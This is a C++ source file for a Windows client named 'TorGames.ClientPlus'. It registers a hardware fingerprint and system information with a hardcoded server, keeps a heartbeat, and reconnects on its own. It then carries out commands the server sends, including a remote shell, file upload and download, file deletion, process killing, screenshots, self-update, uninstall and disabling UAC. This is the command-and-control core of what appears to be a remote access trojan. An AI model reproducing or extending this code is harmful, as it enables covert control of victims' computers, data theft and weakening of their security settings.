// TorGames.ClientPlus - Main client implementation
#include "client.h"
#include "commands.h"
#include "systeminfo.h"
#include "fingerprint.h"
#include "updater.h"
#include "taskscheduler.h"
#include "utils.h"
#include "logger.h"

Client::Client()
    : m_running(false)
    , m_shouldReconnect(true)
    , m_heartbeatThread(nullptr)
    , m_messageThread(nullptr)
    , m_stopEvent(nullptr)
    , m_lastHeartbeat(0) {
}

Client::~Client() {
    Stop();
    if (m_stopEvent) {
        CloseHandle(m_stopEvent);
        m_stopEvent = nullptr;
    }
}

bool Client::Initialize() {
    LOG_INFO("Initializing client");

    // Generate hardware ID
    m_hardwareId = Fingerprint::GetHardwareId();
    LOG_INFO("Hardware ID: %s", m_hardwareId.c_str());

    // Create stop event
    m_stopEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
    if (!m_stopEvent) {
        LOG_ERROR("Failed to create stop event");
        return false;
    }

    return true;
}

bool Client::Connect() {
    LOG_INFO("Connecting to server...");

    if (!m_protocol.Connect(DEFAULT_SERVER, DEFAULT_PORT)) {
        return false;
    }

    // Send registration
    std::string systemInfo = SystemInfo::GetSystemInfoJson();

    if (!m_protocol.SendRegister(CLIENT_TYPE_CLIENT, m_hardwareId.c_str(), systemInfo.c_str())) {
        LOG_ERROR("Failed to send registration");
        m_protocol.Disconnect();
        return false;
    }

    LOG_INFO("Registered as CLIENT");
    m_lastHeartbeat = GetTickCount();

    return true;
}

void Client::Disconnect() {
    m_protocol.Disconnect();
}

void Client::Reconnect() {
    LOG_INFO("Reconnecting in %d ms...", RECONNECT_DELAY);
    Sleep(RECONNECT_DELAY);

    if (m_shouldReconnect && WaitForSingleObject(m_stopEvent, 0) == WAIT_TIMEOUT) {
        Connect();
    }
}

void Client::Run() {
    m_running = true;

    // Initial connection
    if (!Connect()) {
        LOG_WARN("Initial connection failed, will retry...");
    }

    // Start worker threads
    m_heartbeatThread = CreateThread(nullptr, 0, HeartbeatThreadProc, this, 0, nullptr);
    m_messageThread = CreateThread(nullptr, 0, MessageThreadProc, this, 0, nullptr);

    // Main loop - just wait for stop signal
    WaitForSingleObject(m_stopEvent, INFINITE);

    // Cleanup
    if (m_heartbeatThread) {
        WaitForSingleObject(m_heartbeatThread, 5000);
        CloseHandle(m_heartbeatThread);
        m_heartbeatThread = nullptr;
    }
    if (m_messageThread) {
        WaitForSingleObject(m_messageThread, 5000);
        CloseHandle(m_messageThread);
        m_messageThread = nullptr;
    }

    Disconnect();
    m_running = false;
}

void Client::Stop() {
    m_shouldReconnect = false;
    if (m_stopEvent) {
        SetEvent(m_stopEvent);
    }
}

DWORD WINAPI Client::HeartbeatThreadProc(LPVOID param) {
    Client* client = static_cast<Client*>(param);

    while (WaitForSingleObject(client->m_stopEvent, HEARTBEAT_INTERVAL) == WAIT_TIMEOUT) {
        if (client->m_protocol.IsConnected()) {
            if (!client->m_protocol.SendHeartbeat()) {
                LOG_WARN("Heartbeat failed");
            } else {
                client->m_lastHeartbeat = GetTickCount();
            }
        }
    }

    return 0;
}

DWORD WINAPI Client::MessageThreadProc(LPVOID param) {
    Client* client = static_cast<Client*>(param);

    while (WaitForSingleObject(client->m_stopEvent, 0) == WAIT_TIMEOUT) {
        if (!client->m_protocol.IsConnected()) {
            client->Reconnect();
            continue;
        }

        ServerMessage msg;
        if (client->m_protocol.ReceiveMessage(msg, 1000)) {
            client->HandleServerMessage(msg);
        }
    }

    return 0;
}

void Client::HandleServerMessage(const ServerMessage& msg) {
    LOG_DEBUG("Received message type: %s", msg.type.c_str());

    if (msg.type == "accepted" || msg.type == "ack") {
        LOG_DEBUG("Server acknowledged message");
        return;
    }

    if (msg.type == "error") {
        LOG_ERROR("Server error: %s", msg.error.c_str());
        return;
    }

    if (msg.type == "command") {
        // Parse command type
        CommandType cmdType = CommandType::None;

        if (!msg.commandType.empty()) {
            if (msg.commandType == "ping" || msg.commandType == "1") cmdType = CommandType::Ping;
            else if (msg.commandType == "systeminfo" || msg.commandType == "2") cmdType = CommandType::GetSystemInfo;
            else if (msg.commandType == "processlist" || msg.commandType == "3") cmdType = CommandType::GetProcessList;
            else if (msg.commandType == "killprocess" || msg.commandType == "4") cmdType = CommandType::KillProcess;
            else if (msg.commandType == "shell" || msg.commandType == "cmd" || msg.commandType == "5") cmdType = CommandType::RunCommand;
            else if (msg.commandType == "download" || msg.commandType == "6") cmdType = CommandType::Download;
            else if (msg.commandType == "upload" || msg.commandType == "7") cmdType = CommandType::Upload;
            else if (msg.commandType == "listdir" || msg.commandType == "8") cmdType = CommandType::ListDirectory;
            else if (msg.commandType == "deletefile" || msg.commandType == "9") cmdType = CommandType::DeleteFile;
            else if (msg.commandType == "getlogs" || msg.commandType == "10") cmdType = CommandType::GetLogs;
            else if (msg.commandType == "shutdown" || msg.commandType == "11") cmdType = CommandType::Shutdown;
            else if (msg.commandType == "restart" || msg.commandType == "12") cmdType = CommandType::Restart;
            else if (msg.commandType == "uninstall" || msg.commandType == "13") cmdType = CommandType::Uninstall;
            else if (msg.commandType == "update" || msg.commandType == "14") cmdType = CommandType::Update;
            else if (msg.commandType == "screenshot" || msg.commandType == "15") cmdType = CommandType::Screenshot;
            else if (msg.commandType == "messagebox" || msg.commandType == "16") cmdType = CommandType::MessageBox;
            else if (msg.commandType == "update_available" || msg.commandType == "17") cmdType = CommandType::UpdateAvailable;
            else if (msg.commandType == "disableuac" || msg.commandType == "18") cmdType = CommandType::DisableUac;
            else if (msg.commandType == "listdrives" || msg.commandType == "19") cmdType = CommandType::ListDrives;
            else {
                int cmdInt = atoi(msg.commandType.c_str());
                if (cmdInt > 0) {
                    cmdType = static_cast<CommandType>(cmdInt);
                }
            }
        }

        LOG_INFO("Received command: type=%s, id=%s", msg.commandType.c_str(), msg.commandId.c_str());

        // Build payload JSON for command handlers
        char payload[BUFFER_SIZE];
        snprintf(payload, sizeof(payload),
            "{\"commandId\":\"%s\",\"commandType\":\"%s\",\"command\":\"%s\",\"timeout\":%d}",
            msg.commandId.c_str(),
            msg.commandType.c_str(),
            Utils::JsonEscape(msg.commandText).c_str(),
            msg.timeout);

        // Execute command
        CommandResult result = Commands::HandleCommand(cmdType, payload);

        // Send response
        m_protocol.SendCommandResponse(msg.commandId.c_str(), result.success, result.result.c_str());

        // Check if we should exit (e.g., after uninstall or update)
        if (result.shouldExit) {
            LOG_INFO("Command requested exit, stopping client...");
            Sleep(500);
            ExitProcess(0);
        }
    }
}
